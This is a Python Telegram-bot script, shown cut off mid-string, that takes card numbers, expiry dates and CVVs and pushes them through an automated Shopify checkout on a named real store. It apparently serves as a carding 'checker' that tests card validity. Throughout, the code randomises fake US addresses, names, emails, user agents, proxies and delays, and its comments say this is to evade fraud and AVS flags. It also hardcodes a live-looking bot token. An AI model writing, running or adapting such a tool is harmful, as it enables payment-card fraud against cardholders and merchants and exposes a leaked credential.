import re
import json
import requests
from fake_useragent import UserAgent
import time
import random
import telebot
import string
import io
import sys
import logging
import os
import subprocess

BOT_TOKEN = '8440334802:AAHt8avHaz3MmKUq28O1MQ7ysjpVr7VWHvs'

logging.getLogger('telebot').setLevel(logging.CRITICAL)
logging.basicConfig(level=logging.CRITICAL)

bot = telebot.TeleBot(BOT_TOKEN)

proxy_list = []

# List of random US addresses for anonymity (to avoid AVS/fraud flags)
us_addresses = [
    {"address1": "123 Main St", "address2": "", "city": "New York", "countryCode": "US", "postalCode": "10001", "zoneCode": "NY", "lastName": "Doe", "firstName": "John"},
    {"address1": "456 Oak Ave", "address2": "", "city": "Los Angeles", "countryCode": "US", "postalCode": "90001", "zoneCode": "CA", "lastName": "Smith", "firstName": "Emily"},
    {"address1": "789 Pine Rd", "address2": "", "city": "Chicago", "countryCode": "US", "postalCode": "60601", "zoneCode": "IL", "lastName": "Johnson", "firstName": "Alex"},
    {"address1": "101 Elm St", "address2": "", "city": "Houston", "countryCode": "US", "postalCode": "77001", "zoneCode": "TX", "lastName": "Miller", "firstName": "Nico"},
    {"address1": "202 Maple Dr", "address2": "", "city": "Phoenix", "countryCode": "US", "postalCode": "85001", "zoneCode": "AZ", "lastName": "Brown", "firstName": "Tom"},
    {"address1": "303 Cedar Ln", "address2": "", "city": "Philadelphia", "countryCode": "US", "postalCode": "19101", "zoneCode": "PA", "lastName": "Davis", "firstName": "Sarah"},
    {"address1": "404 Birch Blvd", "address2": "", "city": "San Antonio", "countryCode": "US", "postalCode": "78201", "zoneCode": "TX", "lastName": "Wilson", "firstName": "Liam"},
    {"address1": "505 Walnut St", "address2": "", "city": "San Diego", "countryCode": "US", "postalCode": "92101", "zoneCode": "CA", "lastName": "Moore", "firstName": "Emma"},
    {"address1": "606 Spruce Ave", "address2": "", "city": "Dallas", "countryCode": "US", "postalCode": "75201", "zoneCode": "TX", "lastName": "Taylor", "firstName": "Oliver"},
    {"address1": "707 Ash Rd", "address2": "", "city": "San Jose", "countryCode": "US", "postalCode": "95101", "zoneCode": "CA", "lastName": "Anderson", "firstName": "Ava"},
]

def find_between(s, first, last):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""

def get_random_proxy():
    if proxy_list:
        return random.choice(proxy_list)
    return None

first_names = ["John", "Emily", "Alex", "Nico", "Tom", "Sarah", "Liam", "Emma", "Oliver", "Ava"]
last_names = ["Smith", "Johnson", "Miller", "Brown", "Davis", "Wilson", "Moore", "Taylor", "Anderson", "Thomas"]

def random_delay(min_sec=3, max_sec=5):
    """Add random delay to mimic human behavior and avoid rate limits."""
    delay = random.uniform(min_sec, max_sec)
    time.sleep(delay)
    print(f"⏳ Random delay: {delay:.2f}s")

def get_random_address():
    """Get a random US address for billing/shipping anonymity."""
    return random.choice(us_addresses)

def sh(card_details, username):
    start_time = time.time()
    text = card_details.strip()
    pattern = r'(\d{15,16})[^\d]*(\d{1,2})[^\d]*(\d{2,4})[^\d]*(\d{3,4})'
    match = re.search(pattern, text)

    if not match:
        return "Invalid card format. Please provide a valid card number, month, year, and cvv."

    n = match.group(1)
    cc = " ".join(n[i:i+4] for i in range(0, len(n), 4))
    mm_raw = match.group(2)
    mm = str(int(mm_raw))
    yy_raw = match.group(3)
    cvc = match.group(4)

    if len(yy_raw) == 4 and yy_raw.startswith("20"):
        yy = yy_raw[2:]
    elif len(yy_raw) == 2:
        yy = yy_raw
    else:
        return "Invalid year format."

    full_card = f"{n}|{mm_raw.zfill(2)}|{yy}|{cvc}"

    # Enhanced anonymity: Random email, names, address
    ua = UserAgent()
    user_agent = ua.random
    gen_email = lambda: f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com"
    remail = gen_email()
    rfirst = random.choice(first_names)
    rlast = random.choice(last_names)
    random_addr = get_random_address()
    addr1 = random_addr["address1"]
    addr2 = random_addr["address2"]
    city = random_addr["city"]
    country_code = random_addr["countryCode"]
    postal = random_addr["postalCode"]
    zone = random_addr["zoneCode"]
    # Use random last name for address to vary
    addr_last = random.choice(last_names).lower()

    # New session for each check to rotate proxies/user agents fully
    session = requests.Session()
    proxy = get_random_proxy()
    if proxy:
        session.proxies.update(proxy)
        print(f"Using proxy: {proxy['http']}")

    # Step 1: Add to cart
    print("Step 1: Adding to cart...")
    url = "https://violettefieldthreads.com/cart/add.js"
    headers = {
        'authority': 'violettefieldthreads.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://violettefieldthreads.com',
        'referer': 'https://violettefieldthreads.com/products/presley-doll-pants-preorder',
        'user-agent': user_agent,
    }
    data = {
        'form_type': 'product',
        'utf8': '✓',
        'id': '41957285840',
        'quantity': '1',
    }
    response = session.post(url, headers=headers, data=data, proxies=proxy if proxy else None)
    random_delay(2, 4)  # Delay after add to cart
    if response.status_code != 200:
        return f"Failed at step 1: Add to cart. Status: {response.status_code}"
    
    # Step 2: Get cart token
    print("Step 2: Fetching cart...")
    headers = {
        'authority': 'violettefieldthreads.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://violettefieldthreads.com/products/presley-doll-pants-preorder',
        'user-agent': user_agent,
    }
    response = session.get('https://violettefieldthreads.com/cart.js', headers=headers, proxies=proxy if proxy else None)
    raw = response.text
    random_delay(1, 3)
    try:
        res_json = json.loads(raw)
        tok = res_json['token']
    except json.JSONDecodeError:
        return "Failed at step 2: Could not decode cart JSON"
    
    # Step 3: Post to cart page for tokens
    print("Step 3: Posting to cart page...")
    headers = {
        'authority': 'violettefieldthreads.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://violettefieldthreads.com',
        'referer': 'https://violettefieldthreads.com/cart',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user_agent,
    }
    data = {
        'updates[]': '1',
        'checkout': 'Check out',
    }        
    response = session.post(
        'https://violettefieldthreads.com/cart',
        headers=headers,
        data=data,
        allow_redirects=True,
        proxies=proxy if proxy else None
    )
    text = response.text
    x = find_between(text, 'serialized-session-token" content="&quot;', '&quot;"')
    queue_token = find_between(text, '&quot;queueToken&quot;:&quot;', '&quot;')
    stableid = find_between(text, 'stableId&quot;:&quot;', '&quot;')
    paymentmethodidentifier = find_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')

    if not all([x, queue_token, stableid, paymentmethodidentifier]):
        return "Failed at step 3: Could not extract required tokens from cart page."

    random_delay(3, 5)  # Longer delay before PCI to avoid rate limits

    # Step 4: PCI session
    print("Step 4: Creating PCI session...")
    headers = {
        'authority': 'checkout.pci.shopifyinc.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://checkout.pci.shopifyinc.com',
        'referer': 'https://checkout.pci.shopifyinc.com/build/d3eb175/number-ltr.html?identifier=&locationURL=',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-storage-access': 'active',
        'user-agent': user_agent,
    }
    json_data = {
        'credit_card': {
            'number': cc,
            'month': mm,
            'year': yy,
            'verification_value': cvc,
            'start_month': None,
            'start_year': None,
            'issue_number': '',
            'name': f'{rfirst} {rlast}',
        },
        'payment_session_scope': 'violettefieldthreads.com',
    }
    response = session.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data, proxies=proxy if proxy else None)
    random_delay(2, 4)
    try:
        sid = response.json()['id']
        print(f"PCI Session ID: {sid}")
    except (json.JSONDecodeError, KeyError):
        print(f"PCI Response: {response.text[:200]}")
        return "Failed at step 4: Could not get payment session ID"

    random_delay(4, 6)  # Extended delay before submission to simulate user thinking

    # Step 5: Submit for completion
    print("Step 5: Submitting for completion...")
    headers = {
        'authority': 'violettefieldthreads.com',
        'accept': 'application/json',
        'accept-language': 'en-US',
        'content-type': 'application/json',
        'origin': 'https://violettefieldthreads.com',
        'referer': 'https://violettefieldthreads.com/',
        'sec-fetch-site': 'same-origin',
        'shopify-checkout-client': 'checkout-web/1.0',
        'user-agent': user_agent,
        'x-checkout-one-session-token': x,
        'x-checkout-web-deploy-stage': 'production',
        'x-checkout-web-server-handling': 'fast',
        'x-checkout-web-server-rendering': 'yes',
    }
    params = {
        'operationName': 'SubmitForCompletion',
    }
    # Use random address in submission for anonymity
    json_data = {
        'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on RedirectRequiredViolation{target details __typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on TooManyAttempts{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}paymentIcon __typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}finalizedRemoteCheckouts{...FinalizedRemoteCheckoutsResult __typename}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ProcessingRemoteCheckoutsReceipt{id pollDelay remoteCheckouts{...on SubmittingRemoteCheckout{shopId __typename}...on SubmittedRemoteCheckout{shopId __typename}__typename}__typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}parentRelationship{parent{stableId lineAllocations{stableId __typename}__typename}__typename}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment FinalizedRemoteCheckoutsResult on FinalizedRemoteCheckout{shopId result{...on ProcessedRemoteReceipt{orderIdentity{buyerIdentifier id __typename}orderStatusPageUrl remotePurchaseOrder{merchandise{merchandiseLines{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{productId title productTitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}price{amount currencyCode __typename}__typename}__typename}__typename}__typename}checkoutTotal{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}tax{totalTaxAmountV2{amount currencyCode __typename}__typename}payment{paymentLines{amount{amount currencyCode __typename}__typename}__typename}delivery{deliveryLines{deliveryStrategy{handle title __typename}lineAmount{amount currencyCode __typename}__typename}__typename}__typename}__typename}...on FailedRemoteReceipt{recoveryUrl remotePurchaseOrder{merchandise{merchandiseLines{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{productId title productTitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}price{amount currencyCode __typename}__typename}__typename}__typename}__typename}checkoutTotal{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}tax{totalTaxAmountV2{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}cartMetafields{...on CartMetafieldUpdateOperation{key namespace value type appId namespaceAppId valueType __typename}...on CartMetafieldDeleteOperation{key namespace appId __typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded bwpItems merchandiseLines{stableId finalSale merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}parentRelationship{parent{...ParentMerchandiseLine __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}remote{consolidated{totals{subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on 